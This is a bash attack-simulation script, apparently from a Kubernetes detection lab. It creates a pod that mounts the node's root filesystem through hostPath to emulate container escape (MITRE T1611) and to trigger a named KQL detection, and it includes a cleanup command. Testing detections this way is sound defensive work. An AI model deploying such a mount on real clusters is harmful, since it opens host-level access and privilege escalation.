#!/bin/bash
# ============================================================================
# Attack Simulation: hostPath Volume Mount (Container Breakout Vector)
# MITRE ATT&CK: T1611 - Escape to Host
# Stratus technique: k8s.privilege-escalation.hostpath-mount
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: detections/kql/hostpath-volume.kql   (table: AKSAuditAdmin)
# ============================================================================

set -e
POD="adversary-lab-hostpath-$(date +%s)"

echo "[*] Creating pod mounting the node root filesystem: $POD (namespace: victim)"
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: $POD
  namespace: victim
  labels: { adversary-lab/cleanup: "true", adversary-lab/mitre: "T1611" }
spec:
  containers:
    - name: host
      image: busybox:1.36
      command: ["sleep", "3600"]
      volumeMounts:
        - name: noderoot
          mountPath: /host
  volumes:
    - name: noderoot
      hostPath:                    # <-- the signal the detection matches
        path: /
        type: Directory
EOF

echo ""
echo "[*] Expected detection: T1611 - hostPath Volume Mount"
echo "[*] Expected log table: AKSAuditAdmin"
echo "[!] Cleanup: kubectl delete pod $POD -n victim"
